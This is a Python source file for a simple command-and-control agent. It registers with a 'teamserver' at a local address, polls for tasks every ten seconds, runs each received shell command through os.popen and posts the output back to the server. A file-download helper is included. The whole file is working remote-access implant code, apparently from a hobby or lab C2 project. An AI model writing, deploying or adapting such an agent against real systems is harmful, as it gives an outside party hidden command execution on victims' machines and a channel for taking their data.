import requests
import time
import os, sys

TEAMSERVER_URL = 'http://127.0.0.1:8000'

def check_tasks():
    tasks_url = f'{TEAMSERVER_URL}/tasks/{AGENT_NAME}'
    response = requests.get(tasks_url)
    if response.status_code == 200:
        tasks = response.json()
        for task in tasks:
            # Execute the task
            result = execute_task(task)
            send_results(result)
            
    elif response.status_code == 204:
        print('No tasks available.')
    else:
        print(f'Failed to retrieve tasks: {response.status_code}')

def notify_termination():
    url = f'{TEAMSERVER_URL}/results/{AGENT_NAME}'
    data = {
        'result': 'Agent terminated successfully'
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("Agent termination notification sent successfully.")
    else:
        print(f"Failed to send agent termination notification: {response.status_code}")

def execute_task(task):
    if task['type'] == 'command':
        command = task['data']
        if command == 'terminate':
            notify_termination()
            sys.exit(0) # Terminate the agent
        else:
            result = os.popen(command).read()
            return result
    

def send_results(result):
    results_url = f'{TEAMSERVER_URL}/results/{AGENT_NAME}'
    response = requests.post(results_url, data={'result': result})
    if response.status_code == 204:
        print('Results sent successfully.')

def download_file(file_url):
    response = requests.get(file_url)
    if response.status_code == 200:
        with open(file_url, 'wb') as f:
            f.write(response.content)
        print('File downloaded successfully.')

def register_agent():
    url = f'{TEAMSERVER_URL}/register'
    response = requests.post(url, data={'hostname': 'agent001', 'type': 'python'})
    if response.status_code == 200:
        agent_name = response.json()['name']
        print(f'Agent registered successfully with name: {agent_name}')
        return agent_name
    else:
        print(f'Failed to register agent: {response.status_code}')
        return None

if __name__ == '__main__':
    
    agent_name = register_agent()
    AGENT_NAME = agent_name
    if AGENT_NAME != None:
        while True:
            check_tasks()
            time.sleep(10)  # Check tasks every 10 seconds
    else:
        print('Exiting...')
        sys.exit(1)
